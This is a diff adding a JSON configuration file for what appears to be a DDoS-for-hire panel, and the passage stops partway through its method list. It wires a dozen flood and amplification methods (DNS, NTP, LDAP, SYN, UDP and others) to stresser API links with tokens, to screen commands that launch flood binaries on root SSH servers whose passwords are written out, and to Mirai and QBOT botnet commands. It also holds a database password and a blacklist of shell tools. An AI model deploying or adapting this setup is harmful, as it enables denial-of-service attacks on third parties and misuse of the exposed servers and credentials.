@@ -1,0 +1,1925 @@
+{
+	"webserver": {
+		"host": "45.88.90.120",
+		"debug": true,
+		"enabled": true
+	},
+	"database": {
+		"host": "localhost:3306",
+		"username": "inverse",
+		"password": "7gxWCDLGS67PXhXm2sI1xQks8PF8PzuC!?",
+		"table": "ssnaio"
+	},
+	"webhooks": {
+		"telegram": {
+			"attack_sent": {
+				"token": "",
+				"title": "USER ATTACK SENT SUCCESSFULLY",
+				"chat_id": "",
+				"enabled": false
+			},
+			"blacklisted_host": {
+				"token": "",
+				"title": "USER TRIED ATTACKING BLACKLIST",
+				"chat_id": "",
+				"enabled": false
+			}
+		},
+		"discord": {
+			"attack_sent": {
+				"webhook": "",
+				"title": "USER ATTACK SENT SUCCESSFULLY",
+				"image": "https://static.vecteezy.com/system/resources/previews/001/200/261/original/check-png.png",
+				"hex_color": "",
+				"enabled": false
+			},
+			"blacklisted_host": {
+				"webhook": "",
+				"title": "USER TRIED ATTACKING BLACKLIST",
+				"image": "http://www.clipartbest.com/cliparts/RiA/ExB/RiAExBz9T.png",
+				"hex_color": "",
+				"enabled": false
+			}
+		}
+	},
+	"settings": {
+		"kill_switch": {
+			"enabled": false,
+			"auth_code": "12345",
+			"access_key": "abcdefghijklmnopqrstuvwxyz"
+		},
+		"dynamic_attack_sent_page": {
+			"enabled": true,
+			"attack_sent_file": "attack_sent.html"
+		},
+		"blacklists": {
+			"hosts": [
+				".gov",
+				".edu",
+				"curl",
+				".ru",
+				"russia",
+				"wget",
+				"1.1.1.1",
+				">",
+				"<",
+				"echo",
+				"insert",
+				"mysql",
+				"localhost"
+			],
+			"ports": [
+				"19999"
+			]
+		},
+		"attack_settings": {
+			"enabled": true,
+			"admins_bypass_disabled_attacks": true,
+			"api_timeout_seconds": 10,
+			"server_timeout_seconds": 10,
+			"botnet_timeout_seconds": 10,
+			"max_attack_slots": {
+				"max": 99999,
+				"enabled": true
+			},
+			"spam_protection": {
+				"general": {
+					"amount": 3,
+					"per_seconds": 300
+				},
+				"target": {
+					"amount": 3,
+					"per_seconds": 300
+				}
+			}
+		}
+	},
+	"servers": [{
+		"enabled": true,
+		"tag": "LAYER4#1",
+		"max_slots": 20,
+		"config": {
+			"host": "220.158.233.89",
+			"port": 22,
+			"username": "root",
+			"password": "Terminal123$"
+		}
+	}, {
+		"enabled": true,
+		"tag": "LAYER4#2",
+		"max_slots": 20,
+		"config": {
+			"host": "220.158.232.164",
+			"port": 22,
+			"username": "root",
+			"password": "Terminal123$"
+		}
+	}, {
+		"enabled": true,
+		"tag": "LAYER4#3",
+		"max_slots": 20,
+		"config": {
+			"host": "220.158.233.156",
+			"port": 22,
+			"username": "root",
+			"password": "Terminal123$"
+		}
+	}, {
+		"enabled": true,
+		"tag": "LAYER4#4",
+		"max_slots": 20,
+		"config": {
+			"host": "220.158.234.20",
+			"port": 22,
+			"username": "root",
+			"password": "Terminal123$"
+		}
+	}, {
+		"enabled": true,
+		"tag": "LAYER4#5",
+		"max_slots": 20,
+		"config": {
+			"host": "220.158.234.22",
+			"port": 22,
+			"username": "root",
+			"password": "Terminal123$"
+		}
+	}, {
+		"enabled": true,
+		"tag": "LAYER4#6",
+		"max_slots": 20,
+		"config": {
+			"host": "220.158.234.108",
+			"port": 22,
+			"username": "root",
+			"password": "Terminal123$"
+		}
+	}],
+	"botnets": [{
+			"enabled": false,
+			"tag": "MIRAI",
+			"max_slots": 3,
+			"settings": {
+				"initial_enter": {
+					"enabled": false,
+					"sleep_in_milliseconds_before": 500
+				},
+				"tos_page": {
+					"enabled": false,
+					"sleep_in_milliseconds_before": 500,
+					"command": "y"
+				},
+				"sleep_in_milliseconds": {
+					"before_root": 1000,
+					"before_Terminal321$": 1000,
+					"before_command": 1000
+				}
+			},
+			"config": {
+				"host": "8.8.8.8",
+				"port": 22,
+				"username": "root",
+				"password": "Terminal321"
+			}
+		},
+		{
+			"enabled": false,
+			"tag": "QBOT",
+			"max_slots": 999,
+			"settings": {
+				"initial_enter": {
+					"enabled": true,
+					"sleep_in_milliseconds_before": 500
+				},
+				"tos_page": {
+					"enabled": true,
+					"sleep_in_milliseconds_before": 500,
+					"command": "y"
+				},
+				"sleep_in_milliseconds": {
+					"before_root": 1000,
+					"before_Terminal321$": 1000,
+					"before_command": 1000
+				}
+			},
+			"config": {
+				"host": "1.1.1.1",
+				"port": 22,
+				"username": "root",
+				"password": "Terminal321"
+			}
+		}
+	],
+	"attacks": [{
+			"method": "DNS",
+			"apis": {
+				"enabled": true,
+				"links": [{
+						"link": "https://api.cyberstress.co?token=l98VPtercq1S2yEwAAyqck&host={HOST}&port={PORT}&time={TIME}&method=DNS",
+						"max_time": 3600,
+						"enabled": false
+					},
+					{
+						"link": "http://149.5.172.154/spoofed.php?host={HOST}&port={PORT}&time={TIME}&key=key&method=DNS",
+						"max_time": 3600,
+						"enabled": true
+					}
+				]
+
+			},
+			"servers": {
+				"enabled": true,
+				"all": {
+					"enabled": true,
+					"command": "screen -dmS {HOST} ./dns {HOST}/32 0 dnsf.txt 1 10000 {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntf.txt 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 9999,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "STUN",
+			"apis": {
+				"enabled": true,
+				"links": [{
+						"link": "https://api.cyberstress.co?token=LBlGhW1SxJmsugbylDq5jd&host={HOST}&port={PORT}&time=60&method=STUN",
+						"max_time": 3600,
+						"enabled": true
+					},
+					{
+						"link": "http://149.5.172.154/spoofed.php?host={HOST}&port={PORT}&time={TIME}&key=key&method=STUN",
+						"max_time": 3600,
+						"enabled": false
+					}
+				]
+			},
+			"servers": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": "screen -dmS {HOST} ./stun {HOST} {PORT} stunf.txt 1 10000 {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntf.txt 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 9999,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "WSD",
+			"apis": {
+				"enabled": true,
+				"links": [{
+						"link": "https://api.cyberstress.co?token=l98VPtercq1S2yEwAAyqck&host={HOST}&port={PORT}&time={TIME}&method=WSD",
+						"max_time": 3600,
+						"enabled": true
+					},
+					{
+						"link": "http://149.5.172.154/spoofed.php?host={HOST}&port={PORT}&time={TIME}&key=key&method=WSD",
+						"max_time": 3600,
+						"enabled": true
+					}
+				]
+			},
+			"servers": {
+				"enabled": true,
+				"all": {
+					"enabled": true,
+					"command": "screen -dmS {HOST} ./wsd {HOST}/32 0 wsdf.txt 1 7000 {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntf.txt 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 9999,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "LDAP",
+			"apis": {
+				"enabled": true,
+				"links": [{
+						"link": "https://api.cyberstress.co?token=LBlGhW1SxJmsugbylDq5jd&host={HOST}&port={PORT}&time=60&method=WSD",
+						"max_time": 3600,
+						"enabled": true
+					},
+					{
+						"link": "http://5.196.171.207:12345/api/attack?username=HKdbfvNUKH&secret=d6lz0yFwJI&host={HOST}&port={PORT}&time={TIME}&method=LDAP",
+						"max_time": 3600,
+						"enabled": false
+					}
+				]
+			},
+			"servers": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": "screen -dmS {HOST} ./cldap {HOST}/32 0 cldapf.txt 1 3000 {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntf.txt 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 9999,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "TFO",
+			"apis": {
+				"enabled": false,
+				"links": [{
+						"link": "https://api.cyberstress.co?token=l98VPtercq1S2yEwAAyqck&host={HOST}&port={PORT}&time=40&method=TCPTFO",
+						"max_time": 3600,
+						"enabled": true
+					},
+					{
+						"link": "http://149.5.172.154/spoofed.php?host={HOST}&port={PORT}&time={TIME}&key=key&method=TFO",
+						"max_time": 3600,
+						"enabled": true
+					}
+				]
+			},
+			"servers": {
+				"enabled": true,
+				"all": {
+					"enabled": false,
+					"command": "screen -dmS {HOST} ./tfo {HOST} {PORT} 1 7000 {TIME}"
+				},
+				"select": {
+					"enabled": true,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./tfo {HOST} {PORT} 1 25000 {TIME}",
+						"enabled": true
+					}, {
+						"tag": "LAYER4#2",
+						"command": "screen -dmS {HOST} ./tfo {HOST} {PORT} 1 25000 {TIME}",
+						"enabled": true
+					}, {
+						"tag": "LAYER4#3",
+						"command": "screen -dmS {HOST} ./tfo {HOST} {PORT} 1 25000 {TIME}",
+						"enabled": true
+					}, {
+						"tag": "LAYER4#4",
+						"command": "screen -dmS {HOST} ./tfo {HOST} {PORT} 1 25000 {TIME}",
+						"enabled": true
+					}, {
+						"tag": "LAYER4#5",
+						"command": "screen -dmS {HOST} ./tfo {HOST} {PORT} 1 25000 {TIME}",
+						"enabled": true
+					}, {
+						"tag": "LAYER4#6",
+						"command": "screen -dmS {HOST} ./tfo {HOST} {PORT} 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 9999,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "SYN",
+			"apis": {
+				"enabled": true,
+				"links": [{
+						"link": "https://api.cyberstress.co?token=l98VPtercq1S2yEwAAyqck&host={HOST}&port={PORT}&time=40&method=TCPTFO",
+						"max_time": 3600,
+						"enabled": true
+					},
+					{
+						"link": "http://149.5.172.154/spoofed.php?host={HOST}&port={PORT}&time={TIME}&key=key&method=SYN",
+						"max_time": 3600,
+						"enabled": true
+					}
+				]
+			},
+			"servers": {
+				"enabled": true,
+				"all": {
+					"enabled": false,
+					"command": "screen -dmS {HOST} ./tfo {HOST} {PORT} 1 7000 {TIME}"
+				},
+				"select": {
+					"enabled": true,
+					"servers": [{
+							"tag": "LAYER4#1",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "DEDI#1",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 100000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#2",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#3",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#4",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#5",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#6",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#7",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#8",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#12",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#13",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#14",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#15",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#33",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#34",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#35",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#36",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 15000 {TIME}",
+							"enabled": true
+						},
+						{
+							"tag": "LAYER4#37",
+							"command": "screen -dmS {HOST} ./syn {HOST} {PORT} 1 25000 {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 9999,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "UDP",
+			"apis": {
+				"enabled": true,
+				"links": [{
+						"link": "https://api.cyberstress.co?token=l98VPtercq1S2yEwAAyqck&host={HOST}&port={PORT}&time=40&method=VALVE",
+						"max_time": 3600,
+						"enabled": true
+					},
+					{
+						"link": "http://149.5.172.154/spoofed.php?host={HOST}&port={PORT}&time={TIME}&key=key&method=UDP",
+						"max_time": 3600,
+						"enabled": true
+					}
+				]
+			},
+			"servers": {
+				"enabled": true,
+				"all": {
+					"enabled": false,
+					"command": "screen -dmS {HOST} ./udp {HOST} {PORT} 1 7000 {TIME}"
+				},
+				"select": {
+					"enabled": true,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./udp {HOST} {PORT} 1 25000 {TIME}",
+						"enabled": true
+					}, {
+						"tag": "LAYER4#2",
+						"command": "screen -dmS {HOST} ./udp {HOST} {PORT} 1 25000 {TIME}",
+						"enabled": true
+					}, {
+						"tag": "LAYER4#3",
+						"command": "screen -dmS {HOST} ./udp {HOST} {PORT} 1 25000 {TIME}",
+						"enabled": true
+					}, {
+						"tag": "LAYER4#4",
+						"command": "screen -dmS {HOST} ./udp {HOST} {PORT} 1 25000 {TIME}",
+						"enabled": true
+					}, {
+						"tag": "LAYER4#5",
+						"command": "screen -dmS {HOST} ./udp {HOST} {PORT} 1 25000 {TIME}",
+						"enabled": true
+					}, {
+						"tag": "LAYER4#6",
+						"command": "screen -dmS {HOST} ./udp {HOST} {PORT} 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 9999,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "NTP",
+			"apis": {
+				"enabled": true,
+				"links": [{
+						"link": "https://api.cyberstress.co?token=l98VPtercq1S2yEwAAyqck&host={HOST}&port={PORT}&time={TIME}&method=SSDP",
+						"max_time": 3600,
+						"enabled": true
+					},
+
+					{
+						"link": "http://149.5.172.154/spoofed.php?host={HOST}&port={PORT}&time={TIME}&key=key&method=NTP",
+						"max_time": 3600,
+						"enabled": true
+					}
+				]
+			},
+			"servers": {
+				"enabled": true,
+				"all": {
+					"enabled": true,
+					"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntpf.txt 1 8000 {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntf.txt 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 9999,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "RAKNET",
+			"apis": {
+				"enabled": false,
+				"links": [{
+						"link": "https://api.cfxsecurity.ru/?token=nGpUQg0gXBL77eRoDOatoc&host={HOST}&port={PORT}&time={TIME}&method=GAME",
+						"max_time": 3600,
+						"enabled": true
+					}
+
+				]
+			},
+			"servers": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntpf.txt 1 8000 {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntf.txt 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 5,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "MIXAMP",
+			"apis": {
+				"enabled": true,
+				"links": [{
+						"link": "https://api.cfxsecurity.ru/?token=nGpUQg0gXBL77eRoDOatoc&host={HOST}&port={PORT}&time={TIME}&method=MIXAMP",
+						"max_time": 3600,
+						"enabled": true
+					}
+
+				]
+			},
+			"servers": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntpf.txt 1 8000 {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntf.txt 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 5,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "VALVE",
+			"apis": {
+				"enabled": true,
+				"links": [{
+						"link": "https://api.cfxsecurity.ru/?token=nGpUQg0gXBL77eRoDOatoc&host={HOST}&port={PORT}&time={TIME}&method=UDP-BYPASS",
+						"max_time": 3600,
+						"enabled": true
+					}
+
+				]
+			},
+			"servers": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntpf.txt 1 8000 {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntf.txt 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 5,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "OVHTCP",
+			"apis": {
+				"enabled": true,
+				"links": [{
+						"link": "https://api.cfxsecurity.ru/?token=nGpUQg0gXBL77eRoDOatoc&host={HOST}&port={PORT}&time={TIME}&method=OVHACK",
+						"max_time": 3600,
+						"enabled": true
+					}
+
+				]
+			},
+			"servers": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntpf.txt 1 8000 {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"servers": [{
+						"tag": "LAYER4#1",
+						"command": "screen -dmS {HOST} ./ntp {HOST}/32 0 ntf.txt 1 25000 {TIME}",
+						"enabled": true
+					}]
+				}
+			},
+			"botnets": {
+				"enabled": false,
+				"all": {
+					"enabled": true,
+					"command": ".attack UDP {HOST} {PORT} {TIME}"
+				},
+				"select": {
+					"enabled": false,
+					"botnets": [{
+							"tag": "QBOT",
+							"command": ".udp {HOST} {TIME} -dport={PORT}",
+							"enabled": true
+						},
+						{
+							"tag": "MIRAI",
+							"command": "UDPFLOOD {HOST} {PORT} {TIME}",
+							"enabled": true
+						}
+					]
+				}
+			},
+			"configuration": {
+				"target_validation": {
+					"ip_address_targets_only": true,
+					"url_and_domain_targets_only": false
+				},
+				"slots": {
+					"max": 5,
+					"enabled": false
+				},
+				"min_time": {
+					"time": 10,
+					"enabled": false
+				},
+				"max_time": {
+					"hard": {
+						"time": 86400,
+						"enabled": false
+					},
+					"soft": {
+						"time": 600,
+						"enabled": false
+					}
+				},
+				"status": {
+					"enabled": true,
+					"vip": false,
+					"private": {
+						"enabled": false,
+						"users": []
+					}
+				}
+			}
+		},
+		{
+			"method": "SADP",
+			"apis": {
+				"enabled": false,
